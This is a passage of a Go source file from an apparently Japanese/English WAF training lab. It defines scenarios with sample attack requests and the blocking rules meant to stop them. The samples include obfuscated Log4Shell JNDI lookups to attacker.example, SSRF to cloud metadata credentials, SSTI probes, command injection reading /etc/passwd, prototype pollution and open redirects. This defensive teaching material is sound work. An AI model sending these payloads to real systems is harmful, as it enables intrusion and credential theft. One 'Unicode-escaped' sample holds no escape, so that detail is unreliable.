package scenario

import (
	"math/rand/v2"

	w "wafdy/internal/wafrule"
)

// ---------------------------------------------------------------------------
// Level 3: PoC から自分で導く（亜種と誤検知の両方に対応する）
// ---------------------------------------------------------------------------

func multipartUpload(filename, content string) (contentType, body string) {
	return "multipart/form-data; boundary=wafdyboundary",
		"--wafdyboundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n" + content + "\r\n--wafdyboundary--\r\n"
}

func registerLabLevel3() {
	lab(3, &Scenario{
		ID:    "lab-3-log4shell-obfuscated",
		CVE:   "CVE-2021-44228",
		Title: T("Log4Shell 再び: 難読化された JNDI", "Log4Shell returns: obfuscated JNDI"),
		Summary: T("${jndi: を書かずに同じ攻撃をする難読化が出回り始めました。ヘッダーだけでなくクエリ文字列も狙われます。",
			"Obfuscated payloads that never spell out ${jndi: are spreading, targeting query strings as well as headers."),
		Topics: []Text{T("難読化への対応", "Handling obfuscation"), T("本質をとらえる正規表現", "Regexes that capture the essence")},
		Briefing: []Text{
			T("Level 1 で止めた Log4Shell に、難読化した亜種が出回り始めました。Log4j は ${...} の中にさらに ${...} を書くことができ、${lower:j} は j に、${::-j} も j に展開されます。",
				"Obfuscated variants of the Log4Shell attack you stopped in Level 1 are spreading. Log4j allows ${...} nested inside ${...}, and both ${lower:j} and ${::-j} expand to j."),
			T("観測された PoC: User-Agent: ${${lower:j}ndi:ldap://attacker.example/a}",
				"Observed PoC: User-Agent: ${${lower:j}ndi:ldap://attacker.example/a}"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。攻撃はどのヘッダーにもクエリ文字列にも入ってきます。",
				"There is no mitigation guidance this time. Attacks can arrive in any header or in the query string."),
			T("あなたのサイトにはメールの文面を作るツールがあり、正規の利用者が ${name} のような差し込み用の文字列をクエリやヘッダーで送ってきます。",
				"Your site has an email composer, and legitimate users send placeholder strings such as ${name} in queries and headers."),
		},
		Hints: []Text{
			T("難読化されていても、攻撃は必ず「${ の中に、さらに ${ があるか、jndi という文字が来る」形になります。",
				"Even when obfuscated, the attack always has the form \"inside ${ there is another ${, or the word jndi\"."),
			T("正規表現の [^}]* は「} 以外の文字の並び」を表します。${ から次の } までの間を見るのに使えます。",
				"In regex, [^}]* means \"a run of characters other than }\". Use it to look between ${ and the next }."),
			T("すべてのヘッダーの値 (Headers) とクエリ文字列の両方を検査し、URL decode と Lowercase をかけましょう。",
				"Inspect both all header values (Headers) and the query string, applying URL decode and Lowercase."),
		},
		Patterns: []Pattern{
			{Attack, T("${lower:j} で難読化", "Obfuscated with ${lower:j}"), 8, func(r *rand.Rand) Request {
				return withUA(atk(r, browse(r)), "${${lower:j}ndi:ldap://attacker.example/a}")
			}},
			{Attack, T("${::-j} で 1 文字ずつ", "Letter by letter with ${::-j}"), 8, func(r *rand.Rand) Request {
				return withHeader(atk(r, browse(r)), "X-Api-Version", "${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.example/a}")
			}},
			{Attack, T("クエリ文字列に入れる", "In the query string"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/search", q("q", "${jndi:${lower:l}${lower:d}ap://attacker.example/a}")))
			}},
			{Attack, T("大文字小文字を混ぜる", "Mixed case"), 8, func(r *rand.Rand) Request {
				return withHeader(atk(r, browse(r)), "Referer", "${jNdI:ldap://attacker.example/a}")
			}},
			{Attack, T("${env:...:-j} で難読化", "Obfuscated with ${env:...:-j}"), 8, func(r *rand.Rand) Request {
				return withHeader(atk(r, browse(r)), "Cookie", "lang=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://attacker.example/a}")
			}},
			{Benign, T("差し込み文字列を使うメール作成", "Email composer with placeholders"), 25, func(r *rand.Rand) Request {
				req := get(r, "/mail/compose", q("tpl", pick(r, []string{"Hello ${name}", "Your order ${order.id} has shipped", "Dear ${user.firstName} ${user.lastName}"})))
				return withHeader(req, "X-Greeting-Template", "Dear ${name}")
			}},
			{Benign, T("$ を含む検索", "Searches containing $"), 10, func(r *rand.Rand) Request {
				return get(r, "/search", q("q", pick(r, []string{"$100 coupon", "jndi tutorial", "{lower} case"})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-log4shell-obfuscated", w.Or(
			w.Regex(`\$\{[^}]*(\$\{|jndi)`, w.AllHeaderValues(), w.URLDecode, w.Lowercase),
			w.Regex(`\$\{[^}]*(\$\{|jndi)`, w.QueryString(), w.URLDecode, w.Lowercase),
		)),
		SolutionNote: []Text{
			T("\\$\\{[^}]*(\\$\\{|jndi) は「${ のあと、} が来る前に ${ か jndi が現れる」という意味です。難読化は必ず ${ の入れ子を使い、難読化しない場合は jndi が直接現れるので、どちらもとらえられます。",
				"\\$\\{[^}]*(\\$\\{|jndi) means \"after ${, a ${ or jndi appears before any }\". Obfuscation always nests ${, and without obfuscation jndi appears directly, so both are caught."),
			T("${name} のような差し込み文字列は、} までの間に ${ も jndi も現れないので止まりません。jndi という単語だけの検索も ${ がないので止まりません。",
				"Placeholders like ${name} contain neither ${ nor jndi before the }, so they aren't blocked. A search for just the word jndi has no ${, so it isn't blocked either."),
			T("実際の運用では、AWS マネージドルールの Known bad inputs (AWSManagedRulesKnownBadInputsRuleSet) にも Log4j 用のルールがあります。自作ルールと組み合わせると、より確実です。",
				"In production, the AWS managed Known bad inputs rule group (AWSManagedRulesKnownBadInputsRuleSet) also has Log4j rules. Combining it with your own rule adds another layer."),
		},
		Pitfall: w.Block("pitfall-log4shell-obfuscated", w.Contains("${jndi:", w.AllHeaderValues(), w.Lowercase)),
		PitfallNote: []Text{
			T("Level 1 のルールをすべてのヘッダーに広げただけのルールです。入れ子で難読化した攻撃と、クエリ文字列の攻撃がすり抜けます。",
				"This rule just extends the Level 1 rule to all headers. Nested, obfuscated attacks and attacks in the query string slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-ssrf-metadata",
		CVE:   "CWE-918",
		Title: T("SSRF: メタデータへの道をふさぐ", "SSRF: closing the road to metadata"),
		Summary: T("画像の取り込み機能で、サーバーにクラウドのメタデータ (認証情報) を取りに行かせる SSRF が見つかりました。",
			"An image import feature can be tricked into fetching cloud metadata (credentials) from the server side (SSRF)."),
		Topics: []Text{T("許可リスト (NOT)", "Allow lists (NOT)"), T("URL の解釈のずれ", "URL parsing tricks")},
		Briefing: []Text{
			T("商品画像を外部から取り込む GET /api/fetch?url=<画像の URL> が、指定された URL にサーバー側からアクセスします。これを使ってインスタンスメタデータ (169.254.169.254) から IAM の認証情報を盗む SSRF が見つかりました。",
				"GET /api/fetch?url=<image URL>, which imports product images, fetches the given URL from the server side. It can be abused to steal IAM credentials from the instance metadata service (169.254.169.254) — an SSRF."),
			T("観測された PoC: /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
				"Observed PoC: /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
		},
		Conditions: []Text{
			T("画像の取り込み元として許可しているのは、images.example.com・cdn.example.net・img.example.org の 3 つだけで、すべて https です。",
				"The only allowed image sources are images.example.com, cdn.example.net, and img.example.org, all over https."),
			T("攻撃者は IP アドレスを 10 進数や 16 進数で書いたり、許可されたドメインに見せかけたりしてきます。",
				"Attackers write IP addresses in decimal or hex, or disguise them as allowed domains."),
		},
		Hints: []Text{
			T("169.254.169.254 の書き方は無数にあります (2852039166、0xa9fea9fe、[::ffff:a9fe:a9fe] など)。禁止するものを並べるより、許可するものだけを通すほうが確実です。",
				"There are countless ways to write 169.254.169.254 (2852039166, 0xa9fea9fe, [::ffff:a9fe:a9fe], ...). Allowing only what's permitted is more reliable than listing what's forbidden."),
			T("「/api/fetch へのリクエスト」AND NOT「url が許可した URL で始まる」でブロックします。",
				"Block when \"the request is to /api/fetch\" AND NOT \"url starts with an allowed URL\"."),
			T("https://images.example.com@169.254.169.254/ は、@ の前がユーザー名として扱われ、実際の接続先は 169.254.169.254 になります。ホスト名の直後に / が来ることまで確認しましょう。",
				"In https://images.example.com@169.254.169.254/, everything before @ is treated as a user name, and the real destination is 169.254.169.254. Check that a / comes right after the host name."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")))
			}},
			{Attack, T("10 進数の IP アドレス", "IP address in decimal"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "http://2852039166/latest/meta-data/")))
			}},
			{Attack, T("16 進数の IP アドレス", "IP address in hex"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "http://0xa9fea9fe/latest/meta-data/")))
			}},
			{Attack, T("IPv6 で書いたアドレス", "Address written as IPv6"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "http://[::ffff:a9fe:a9fe]/latest/meta-data/")))
			}},
			{Attack, T("EC2 の内部ホスト名", "EC2's internal host name"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "http://instance-data/latest/meta-data/")))
			}},
			{Attack, T("許可ドメインをユーザー名に見せかける", "Allowed domain disguised as a user name"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "https://images.example.com@169.254.169.254/latest/meta-data/")))
			}},
			{Attack, T("許可ドメインのサブドメインに見せかける", "Disguised as a subdomain of an allowed domain"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/api/fetch", q("url", "https://images.example.com.attacker.example/redirect-to-metadata")))
			}},
			{Benign, T("許可された取り込み元の画像", "Images from allowed sources"), 30, func(r *rand.Rand) Request {
				return get(r, "/api/fetch", q("url", pick(r, []string{
					"https://images.example.com/cat.png",
					"https://cdn.example.net/169254/banner.png",
					"https://img.example.org/a9fe/logo.png",
					"https://images.example.com/products/2852039166.jpg",
				})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-ssrf-fetch", w.And(
			w.StartsWith("/api/fetch", w.UriPath(), w.Lowercase),
			w.Not(w.Regex(`^https://(images\.example\.com|cdn\.example\.net|img\.example\.org)/`, w.QueryArg("url"), w.URLDecode, w.Lowercase)),
		)),
		SolutionNote: []Text{
			T("「許可した 3 つのホストの直後に / が来る https の URL」以外をすべて止めます。IP アドレスの書き方をいくら変えても、許可リストには入れません。",
				"Block everything except https URLs whose host is one of the three allowed hosts followed immediately by a /. However the IP address is rewritten, it never gets onto the allow list."),
			T("正規表現の ^ で先頭に固定し、ホスト名の . を \\. とエスケープし、直後の / まで含めることで、@ や .attacker.example を使ったなりすましも防げます。",
				"Anchoring with ^, escaping the dots in host names as \\., and including the following / also defeats impersonation using @ or .attacker.example."),
			T("SSRF は WAF だけでなく、アプリ側の許可リストや IMDSv2 (トークン必須のメタデータ) でも防ぐのが基本です。",
				"SSRF should also be defended in the app (its own allow list) and with IMDSv2 (token-required metadata), not just by WAF."),
		},
		Pitfall: w.Block("pitfall-ssrf", w.Contains("169.254.169.254", w.QueryArg("url"), w.URLDecode)),
		PitfallNote: []Text{
			T("PoC の IP アドレスを禁止するルールです。10 進数・16 進数・IPv6・内部ホスト名・なりすましドメインのどれもすり抜けます。",
				"This rule forbids the PoC's IP address. Decimal, hex, IPv6, the internal host name, and the impersonating domains all slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-ssti",
		CVE:   "CWE-1336",
		Title: T("SSTI: 名前欄で計算させる", "SSTI: making the name field do math"),
		Summary: T("挨拶カードの名前がテンプレートとして評価され、サーバー上でコードを実行される脆弱性。",
			"The name on a greeting card is evaluated as a template, allowing code execution on the server."),
		Topics: []Text{T("テンプレートの構文", "Template syntax"), T("記号を含む正規の値", "Legitimate values with symbols")},
		Briefing: []Text{
			T("挨拶カードを作る GET /card?name=<名前> が、名前をそのまま Jinja2 テンプレートとして評価していました (サーバーサイドテンプレートインジェクション, SSTI)。",
				"GET /card?name=<name>, which generates greeting cards, was evaluating the name directly as a Jinja2 template (server-side template injection, SSTI)."),
			T("観測された PoC: /card?name={{7*7}} → カードに 49 と表示される",
				"Observed PoC: /card?name={{7*7}} → the card shows 49"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。Jinja2 には {{ ... }} 以外の構文もあります。",
				"There is no mitigation guidance this time. Jinja2 has syntax besides {{ ... }}."),
			T("お客様の名前やチーム名には、{Team A} のように波括弧が入ることがあります。",
				"Customer and team names sometimes contain braces, as in {Team A}."),
		},
		Hints: []Text{
			T("Jinja2 では {{ ... }} が式、{% ... %} が文 (print や for など) です。どちらも { の直後に { か % が続きます。",
				"In Jinja2, {{ ... }} is an expression and {% ... %} is a statement (print, for, ...). Both have { followed immediately by { or %."),
			T("検査対象は Single query parameter の name です。% は URL エンコードされて %25 になるので、URL decode を忘れずに。",
				"Inspect the name parameter with Single query parameter. % is URL-encoded as %25, so don't forget URL decode."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま ({{7*7}})", "The PoC as published ({{7*7}})"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/card", q("name", "{{7*7}}")))
			}},
			{Attack, T("設定の読み出し", "Reading the config"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/card", q("name", "{{config.items()}}")))
			}},
			{Attack, T("{% %} の文", "A {% %} statement"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/card", q("name", "{%print(7*7)%}")))
			}},
			{Attack, T("クラスの探索", "Exploring classes"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/card", q("name", "{{''.__class__.__mro__}}")))
			}},
			{Attack, T("{% for %} の文", "A {% for %} statement"), 8, func(r *rand.Rand) Request {
				return atk(r, get(r, "/card", q("name", "{% for c in [1,2,3] %}{{c}}{% endfor %}")))
			}},
			{Benign, T("波括弧を含む名前", "Names with braces"), 30, func(r *rand.Rand) Request {
				return get(r, "/card", q("name", pick(r, []string{"Taro {Team A}", "Alice}{Bob", "{smile} Hanako", "Ken", "50% Off Club"})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-ssti", w.Regex(`\{[{%]`, w.QueryArg("name"), w.URLDecode)),
		SolutionNote: []Text{
			T("\\{[{%] は「{ のあとに { か % が続く」という意味で、Jinja2 の式と文の両方の始まりをとらえます。",
				"\\{[{%] means \"{ followed by { or %\", catching the start of both Jinja2 expressions and statements."),
			T("{Team A} や }{ のように波括弧が 1 つずつ現れる名前は止まりません。50% のように % だけがある名前も止まりません。",
				"Names where braces appear singly, like {Team A} or }{, aren't blocked. Neither are names with just a %, like 50%."),
		},
		Pitfall: w.Block("pitfall-ssti", w.Contains("{{", w.QueryArg("name"), w.URLDecode)),
		PitfallNote: []Text{
			T("PoC の {{ だけを探すルールです。{% ... %} の文を使う攻撃がすり抜けます。",
				"This rule only looks for the PoC's {{. Attacks using {% ... %} statements slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-command-injection",
		CVE:   "CWE-78",
		Title: T("OS コマンドインジェクション: ping の後ろに続くもの", "OS command injection: what follows the ping"),
		Summary: T("ネットワーク診断ページが、入力をそのままシェルコマンドに渡していました。",
			"A network diagnostics page was passing its input straight into a shell command."),
		Topics: []Text{T("許可リスト (正規表現)", "Allow lists (regex)"), T("区切り文字の多様さ", "The many command separators")},
		Briefing: []Text{
			T("社内向けの診断ツール GET /tools/ping?host=<ホスト> が、host の値をそのまま ping コマンドに渡していました。; などで区切ると、別のコマンドを実行できてしまいます。",
				"The internal diagnostics tool GET /tools/ping?host=<host> was passing host straight to the ping command. Separating with ; and the like lets attackers run other commands."),
			T("観測された PoC: /tools/ping?host=127.0.0.1;cat+/etc/passwd",
				"Observed PoC: /tools/ping?host=127.0.0.1;cat+/etc/passwd"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。シェルでコマンドをつなぐ方法は ; 以外にもたくさんあります。",
				"There is no mitigation guidance this time. Shells offer many ways to chain commands besides ;."),
			T("正規の host は、ホスト名 (英数字・ドット・ハイフン)、IPv4 アドレス、IPv6 アドレスだけです。",
				"Legitimate host values are only host names (letters, digits, dots, hyphens), IPv4 addresses, and IPv6 addresses."),
		},
		Hints: []Text{
			T(";・|・&&・`...`・$(...)・改行など、区切り方を全部並べるのは大変です。「正規の値の形」を正規表現で書き、それに当てはまらないものを止めましょう。",
				"Listing every separator — ;, |, &&, `...`, $(...), newlines — is hard. Write the shape of legitimate values as a regex and block anything that doesn't fit."),
			T("^ と $ で全体を固定し、[a-z0-9.:-]+ のように使ってよい文字だけを並べます。",
				"Anchor the whole value with ^ and $, and list only the allowed characters, as in [a-z0-9.:-]+."),
		},
		Patterns: []Pattern{
			{Attack, T("; で区切る (PoC)", "Separated with ; (PoC)"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "127.0.0.1;cat /etc/passwd")))
			}},
			{Attack, T("パイプ |", "Pipe |"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "127.0.0.1|id")))
			}},
			{Attack, T("&& でつなぐ", "Chained with &&"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "127.0.0.1&&whoami")))
			}},
			{Attack, T("バッククォート", "Backticks"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "`id`.attacker.example")))
			}},
			{Attack, T("$( ) によるコマンド置換", "Command substitution with $( )"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "$(id).attacker.example")))
			}},
			{Attack, T("改行で区切る", "Separated with a newline"), 6, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/ping", q("host", "127.0.0.1\nid")))
			}},
			{Benign, T("正規の診断", "Legitimate diagnostics"), 30, func(r *rand.Rand) Request {
				return get(r, "/tools/ping", q("host", pick(r, []string{"example.com", "10.0.0.1", "api-01.example.co.jp", "2001:db8::1", "DB-Primary.example.com"})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-ping-injection", w.And(
			w.StartsWith("/tools/ping", w.UriPath(), w.Lowercase),
			w.Not(w.Regex(`^[a-z0-9.:-]+$`, w.QueryArg("host"), w.URLDecode, w.Lowercase)),
		)),
		SolutionNote: []Text{
			T("「/tools/ping へのリクエストで、host が英数字・ドット・コロン・ハイフンだけでできていない」ものを止めます。区切り文字を 1 つずつ数え上げる必要がありません。",
				"Block requests to /tools/ping whose host is not made up only of letters, digits, dots, colons, and hyphens. No need to enumerate separators one by one."),
			T("Lowercase をかけているので、DB-Primary のような大文字を含むホスト名も許可リストに入ります。",
				"Because Lowercase is applied, host names with capitals such as DB-Primary also fit the allow list."),
			T("許可リストは強力ですが、正規の値の形を正しく把握していることが前提です。本番では Count アクションで様子を見てから Block に切り替えましょう。",
				"Allow lists are powerful, but they assume you know the shape of legitimate values. In production, watch with the Count action before switching to Block."),
		},
		Pitfall: w.Block("pitfall-ping", w.Contains(";", w.QueryArg("host"), w.URLDecode)),
		PitfallNote: []Text{
			T("PoC の ; だけを止めるルールです。|・&&・バッククォート・$( )・改行を使う攻撃がすり抜けます。",
				"This rule blocks only the PoC's ;. Attacks using |, &&, backticks, $( ), or newlines slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-prototype-pollution",
		CVE:   "CWE-1321",
		Title: T("Prototype Pollution: JSON のキーに潜む __proto__", "Prototype pollution: __proto__ hiding in JSON keys"),
		Summary: T("Node.js の API で、JSON の特殊なキーを使ってすべてのオブジェクトに isAdmin を生やされる脆弱性。",
			"A Node.js API lets attackers use special JSON keys to add isAdmin to every object."),
		Topics: []Text{T("JS_DECODE", "JS_DECODE"), T("JSON の構造を意識した正規表現", "Regexes aware of JSON structure")},
		Briefing: []Text{
			T("プロフィールを更新する POST /api/profile (JSON) が、受け取ったオブジェクトを既存のオブジェクトに深くマージしていました。__proto__ というキーを送ると、すべてのオブジェクトの共通の親 (プロトタイプ) が書き換わり、isAdmin などの属性が全員に付いてしまいます。",
				"POST /api/profile (JSON), which updates profiles, deep-merges the received object into an existing one. Sending a key named __proto__ rewrites the common parent (prototype) of every object, giving attributes such as isAdmin to everyone."),
			T("観測された PoC: {\"__proto__\":{\"isAdmin\":true}}",
				"Observed PoC: {\"__proto__\":{\"isAdmin\":true}}"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。プロトタイプには __proto__ 以外の経路 (constructor.prototype) からも到達できます。",
				"There is no mitigation guidance this time. The prototype can also be reached through constructor.prototype, not just __proto__."),
			T("JSON の文字列は \\u005f のような Unicode エスケープで書くこともでき、パースすると同じ文字になります。",
				"JSON strings may also use Unicode escapes such as \\u005f, which become the same characters after parsing."),
			T("正規の利用者は、constructor (建設会社名) や prototype (タグ名) という言葉を値として送ることがあります。",
				"Legitimate users sometimes send the words constructor (a construction company name) or prototype (a tag) as values."),
		},
		Hints: []Text{
			T("テキスト変換 JS_DECODE は \\uHHHH などのエスケープを元の文字に戻します。",
				"The JS_DECODE text transformation turns escapes such as \\uHHHH back into the original characters."),
			T("危険なのは「キー」として使われたときだけです。JSON のキーは \"...\" のあとに : が続きます。",
				"It's only dangerous when used as a key. In JSON, a key is \"...\" followed by :."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (__proto__)", "The PoC as published (__proto__)"), 8, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"__proto__":{"isAdmin":true}}`))
			}},
			{Attack, T("constructor.prototype 経由", "Via constructor.prototype"), 8, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"constructor":{"prototype":{"isAdmin":true}}}`))
			}},
			{Attack, T("Unicode エスケープした __proto__", "Unicode-escaped __proto__"), 8, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"__proto__":{"isAdmin":true}}`))
			}},
			{Attack, T("入れ子の中の __proto__", "__proto__ nested deeper"), 8, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"profile":{"name":"x","__proto__":{"role":"admin"}}}`))
			}},
			{Attack, T("空白を入れた constructor.prototype", "constructor.prototype with spaces"), 8, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/profile", `{"constructor" : { "prototype" : {"isAdmin": true}}}`))
			}},
			{Benign, T("正規のプロフィール更新", "Legitimate profile updates"), 30, func(r *rand.Rand) Request {
				return postJSON(r, "/api/profile", pick(r, []string{
					`{"name":"Alice","protocol":"https"}`,
					`{"name":"Bob","employer":{"constructor":"ACME Builders"}}`,
					`{"name":"Carol","tags":["prototype","beta"]}`,
					`{"name":"Dave","bio":"I love __init__ in Python"}`,
				}))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-prototype-pollution", w.Regex(`"(__proto__|prototype)"\s*:`, w.BodyField(), w.JSDecode)),
		SolutionNote: []Text{
			T("JS_DECODE で \\u005f を _ に戻してから、\"__proto__\" か \"prototype\" のあとに : が続く (= キーとして使われている) ものに一致させます。",
				"After JS_DECODE turns \\u005f back into _, match \"__proto__\" or \"prototype\" followed by : (that is, used as a key)."),
			T("constructor は値として使われることが多いので条件に入れず、その中の prototype キーでとらえます。[\"prototype\", ...] のように値として出てくる場合は : が続かないので止まりません。",
				"constructor is often used as a value, so it isn't part of the condition; the prototype key inside it is caught instead. When prototype appears as a value, as in [\"prototype\", ...], no : follows, so it isn't blocked."),
			T("\\s* で、キーと : の間の空白にも対応しています。",
				"\\s* allows for whitespace between the key and the :."),
		},
		Pitfall: w.Block("pitfall-prototype-pollution", w.Contains("__proto__", w.BodyField())),
		PitfallNote: []Text{
			T("PoC の __proto__ をそのまま探すルールです。constructor.prototype 経由の攻撃と、Unicode エスケープした攻撃がすり抜けます。",
				"This rule looks for the PoC's __proto__ verbatim. Attacks via constructor.prototype and Unicode-escaped attacks slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-open-redirect",
		CVE:   "CWE-601",
		Title: T("オープンリダイレクト: ログイン後の行き先", "Open redirect: where you land after login"),
		Summary: T("ログイン後の遷移先に外部のサイトを指定でき、フィッシングに悪用されています。",
			"The post-login destination accepts external sites and is being abused for phishing."),
		Topics: []Text{T("許可リスト (NOT)", "Allow lists (NOT)"), T("ブラウザの URL の解釈", "How browsers parse URLs")},
		Briefing: []Text{
			T("ログイン後に元のページへ戻すための GET /login/callback?next=<遷移先> が、外部のサイトへのリダイレクトも受け付けていました。本物のドメインから偽サイトへ誘導するフィッシングに悪用されています。",
				"GET /login/callback?next=<destination>, which returns users to their original page after login, also accepted redirects to external sites. It's being abused for phishing, leading victims from the real domain to fake sites."),
			T("観測された PoC: /login/callback?next=https://attacker.example/",
				"Observed PoC: /login/callback?next=https://attacker.example/"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。正規の next は、サイト内のパス (/ で始まる) だけです。",
				"There is no mitigation guidance this time. Legitimate next values are only paths within the site (starting with /)."),
			T("ブラウザは //attacker.example や /\\attacker.example も「別のサイト」として扱います。",
				"Browsers also treat //attacker.example and /\\attacker.example as \"another site\"."),
		},
		Hints: []Text{
			T("「next が / で始まり、2 文字目が / でも \\ でもない」ものだけを許可しましょう。",
				"Allow only values where next starts with / and the second character is neither / nor \\."),
			T("正規表現の [^/\\\\] は「/ と \\ 以外の 1 文字」です。next=/ だけの場合も許可する必要があります。",
				"In regex, [^/\\\\] means \"one character other than / and \\\". You also need to allow next=/ on its own."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", q("next", "https://attacker.example/")))
			}},
			{Attack, T("スキームを省略 (//)", "Scheme omitted (//)"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", q("next", "//attacker.example/")))
			}},
			{Attack, T("バックスラッシュ (/\\)", "Backslash (/\\)"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", q("next", `/\attacker.example/`)))
			}},
			{Attack, T("二重にエンコードしたスラッシュ", "Double-encoded slashes"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", "next=%252F%252Fattacker.example"))
			}},
			{Attack, T("大文字のスキーム", "Uppercase scheme"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", q("next", "HTTPS://attacker.example/")))
			}},
			{Attack, T("javascript: スキーム", "javascript: scheme"), 7, func(r *rand.Rand) Request {
				return atk(r, get(r, "/login/callback", q("next", "javascript:alert(document.domain)")))
			}},
			{Benign, T("サイト内への正規の遷移", "Legitimate in-site destinations"), 30, func(r *rand.Rand) Request {
				return get(r, "/login/callback", q("next", pick(r, []string{"/account", "/orders?id=1", "/", "/search?q=//comment"})))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-open-redirect", w.And(
			w.StartsWith("/login/callback", w.UriPath(), w.Lowercase),
			w.Not(w.Regex(`^/([^/\\]|$)`, w.QueryArg("next"), w.URLDecode, w.URLDecode)),
		)),
		SolutionNote: []Text{
			T("^/([^/\\\\]|$) は「/ で始まり、次の文字が / でも \\ でもない、または / だけで終わる」という意味です。これに当てはまらない next をすべて止めます。",
				"^/([^/\\\\]|$) means \"starts with /, and the next character is neither / nor \\, or the value is just /\". Every next that doesn't fit is blocked."),
			T("URL decode を 2 回かけるので、%252F%252F のように二重にエンコードしたスラッシュも // として判定できます。",
				"Decoding twice also lets the rule see double-encoded slashes such as %252F%252F as //."),
			T("/search?q=//comment のように、パスの途中に // が出てくる正規の遷移は止まりません。",
				"Legitimate destinations with // later in the path, such as /search?q=//comment, aren't blocked."),
		},
		Pitfall: w.Block("pitfall-open-redirect", w.Contains("http", w.QueryArg("next"), w.URLDecode, w.Lowercase)),
		PitfallNote: []Text{
			T("「http を含むものを止める」ルールです。//・/\\・二重エンコード・javascript: を使う攻撃がすり抜けます。",
				"This rule blocks values containing http. Attacks using //, /\\, double encoding, and javascript: slip through."),
		},
	})

	lab(3, &Scenario{
		ID:    "lab-3-file-upload",
		CVE:   "CWE-434",
		Title: T("ファイルアップロード: 画像のふりをしたスクリプト", "File upload: scripts posing as images"),
		Summary: T("プロフィール画像のアップロードで、PHP のスクリプトをアップロードされ実行される脆弱性。",
			"The profile picture upload accepts PHP scripts, which then get executed."),
		Topics: []Text{T("multipart の Body", "Multipart bodies"), T("拡張子の抜け道", "Extension tricks")},
		Briefing: []Text{
			T("プロフィール画像をアップロードする POST /upload が、拡張子を確認せずにファイルを公開ディレクトリに保存していました。PHP のスクリプトをアップロードされ、そのファイルにアクセスされると実行されてしまいます。",
				"POST /upload, which accepts profile pictures, saved files to a public directory without checking their extension. Uploaded PHP scripts run when someone accesses them."),
			T("観測された PoC: multipart/form-data で filename=\"shell.php\" のファイルをアップロード",
				"Observed PoC: uploading a file with filename=\"shell.php\" via multipart/form-data"),
		},
		Conditions: []Text{
			T("今回は防ぎ方の情報がありません。このサーバーの設定では、.php だけでなく .php5 や .phtml、さらに shell.php.jpg のように途中に .php があるファイルも PHP として実行されます。",
				"There is no mitigation guidance this time. With this server's configuration, not only .php but also .php5, .phtml, and files with .php in the middle, like shell.php.jpg, run as PHP."),
			T("ファイル名は multipart の Body の中に filename=\"...\" として入っています。お客様は php-guide.pdf のような名前のファイルも送ってきます。",
				"The file name sits inside the multipart body as filename=\"...\". Customers also upload files with names like php-guide.pdf."),
		},
		Hints: []Text{
			T("filename=\" のあと、閉じる \" までの間に .php・.php5・.phtml などが現れるかを正規表現で調べます。",
				"Use a regex to check whether .php, .php5, .phtml and so on appear after filename=\" and before the closing \"."),
